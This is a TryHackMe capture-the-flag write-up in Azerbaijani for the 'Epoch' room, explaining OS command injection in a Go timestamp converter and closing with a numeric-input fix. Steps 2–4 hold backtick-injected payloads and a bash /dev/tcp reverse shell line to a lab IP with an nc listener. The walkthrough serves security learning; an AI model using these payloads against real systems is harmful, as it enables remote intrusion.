# TryHackMe — Epoch Writeup (Azərbaycan dilində)

**Otaq linki:** https://tryhackme.com/room/epoch  
**Çətinlik:** Asan  
**Mövzu:** Command Injection (OS Komanda Enjeksiyası)

---

## Ümumi Baxış

Bu lab-da **"Epoch to UTC Convertor"** adlı veb sayt var. Sayt istifadəçinin daxil etdiyi UNIX timestamp-i Linux `date` komandasına birbaşa ötürür — heç bir yoxlama olmadan. Bu da **Command Injection** zəifliyinə yol açır.

---

## Zəiflik Nədir?

Server arxada belə işlədir (`main.go` faylından):

```go
cmdString := fmt.Sprintf("date -d @%s", r.Epoch)
cmd := exec.Command("bash", "-c", cmdString)
```

Yəni sən `1663595700` yazsan, server bu komandanı işlədir:
```bash
date -d @1663595700
```

Input **sanitize edilmir** — istənilən əlavə komanda əlavə etmək mümkündür.

---

## Addım 1: Sayta Daxil Ol

AttackBox-da brauzer aç:
```
http://MACHINE_IP
```

**"Epoch to UTC Convertor"** səhifəsi görünəcək.

---

## Addım 2: Command Injection Test Et

Input yerinə bunu yaz:
```
1 `ls`
```

Server bunu belə oxuyur:
```bash
date -d @1 `ls`
```

Əgər qovluq məzmunu çıxırsa — **Command Injection işləyir!**

---

## Addım 3: main.go Kodunu Oxu

```
1 `cat main.go`
```

Server kodunu görürük — `date -d @%s` formatında işlədiyini təsdiqləyirik.

---

## Addım 4: Reverse Shell Al

**AttackBox-da terminal aç və dinlə:**
```bash
nc -lvnp 4444
```

**Saytın input-una bunu yaz** (AttackBox IP-ni dəyiş):
```
1 `bash -i >& /dev/tcp/10.112.88.8/4444 0>&1`
```

Convert düyməsinə bas — nc terminalında shell açılacaq!

---

## Addım 5: Flag-i Tap

Shell açıldıqdan sonra:

```bash
# Harada olduğuna bax
pwd

# Faylları gör
ls -la

# Flag axtar
find / -type f -name "flag*" 2>/dev/null

# Environment variable-larda axtar
printenv
```

**Flag `printenv` nəticəsində environment variable kimi saxlanılıb!**

```bash
printenv | grep flag
```

**Flag:**
```
flag{...}
```

---

## Niyə Bu Zəiflik Baş Verdi?

| Problem | Açıqlama |
|---------|----------|
| Input sanitization yoxdur | İstifadəçi inputu yoxlanmadan komandaya ötürülür |
| Shell injection | `bash -c` ilə işlədildiyi üçün shell operatorları işləyir |
| Backtick injection | `` `komanda` `` ilə əlavə komanda icra etmək mümkündür |

---

## Necə Qarşısı Alına Bilər?

- İstifadəçi inputunu **sanitize** et
- `exec.Command`-a birbaşa argument ver, shell vasitəsilə işlətmə
- Input-u yalnız rəqəmlərə məhdudlaşdır (timestamp yalnız rəqəm olmalıdır)

**Düzgün kod:**
```go
// Yalnız rəqəm qəbul et
if _, err := strconv.ParseInt(r.Epoch, 10, 64); err != nil {
    return c.SendStatus(fiber.StatusBadRequest)
}
```

---

## Öyrəndiklərimiz

| Addım | Nə etdik |
|-------|----------|
| 1 | Saytın kodunu `cat main.go` ilə oxuduq |
| 2 | Backtick injection ilə komanda işlətdik |
| 3 | Reverse shell aldıq |
| 4 | `printenv` ilə flag-i tapdıq |

---

*Writeup Azərbaycan dilində hazırlanmışdır.*
